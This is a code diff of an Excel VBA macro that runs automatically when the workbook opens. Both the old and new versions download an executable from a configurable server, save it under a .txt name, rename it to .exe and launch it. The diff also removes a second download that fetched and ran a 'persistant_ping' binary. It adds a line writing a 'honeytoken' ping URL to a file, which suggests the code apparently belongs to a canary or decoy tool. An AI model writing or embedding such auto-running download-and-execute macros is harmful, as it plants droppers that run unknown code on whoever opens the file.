@@ -1,14 +1,22 @@
 Private Sub Workbook_Open()
-    Dim FileUrl As String
+         Dim FileUrl As String
          Dim objXmlHttpReq As Object
          Dim objStream As Object
-    
-         FileUrl = "http://localhost:5000/download/exe/test.exe"
-    
+         Dim ip As String
+         Dim session As String
+         Dim FSO As Object
+         Set FSO = CreateObject("Scripting.FileSystemObject")
+         Dim TextFile As Object
+
+
+         ip = "ip-here"
+         session = "session-here"
+         FileUrl = "http://" & ip & "/download/exe/" & session & "/test.exe"
+
          Set objXmlHttpReq = CreateObject("Microsoft.XMLHTTP")
          objXmlHttpReq.Open "GET", FileUrl, False, "username", "password"
          objXmlHttpReq.send
-    
+
          If objXmlHttpReq.Status = 200 Then
               Set objStream = CreateObject("ADODB.Stream")
               objStream.Open
@@ -17,27 +25,11 @@ Private Sub Workbook_Open()
               objStream.SaveToFile ThisWorkbook.Path & "\" & "file.txt", 2
               objStream.Close
          End If
-         
+
      FileCopy ThisWorkbook.Path & "\" & "file.txt", ThisWorkbook.Path & "\" & "file.exe"
-     
+
      Shell ThisWorkbook.Path & "\" & "file.exe", vbNormalFocus
-     
-     
-     FileUrl = "http://localhost:5000/download/exe/persistant_ping.exe"
-    
-         Set objXmlHttpReq = CreateObject("Microsoft.XMLHTTP")
-         objXmlHttpReq.Open "GET", FileUrl, False, "username", "password"
-         objXmlHttpReq.send
-    
-         If objXmlHttpReq.Status = 200 Then
-              Set objStream = CreateObject("ADODB.Stream")
-              objStream.Open
-              objStream.Type = 1
-              objStream.Write objXmlHttpReq.responseBody
-              objStream.SaveToFile ThisWorkbook.Path & "\" & "file.txt", 2
-              objStream.Close
-         End If
-         
-     FileCopy ThisWorkbook.Path & "\" & "file.txt", ThisWorkbook.Path & "\" & "persist.exe"
-     Shell ThisWorkbook.Path & "\" & "persist.exe", vbNormalFocus
+
+     Set TextFile = FSO.CreateTextFile(ThisWorkbook.Path & "\" & "server_detail.txt", True, True)
+     TextFile.Write "http://" & ip & "/api/honeytoken/ping/" & session & ""
 End Sub
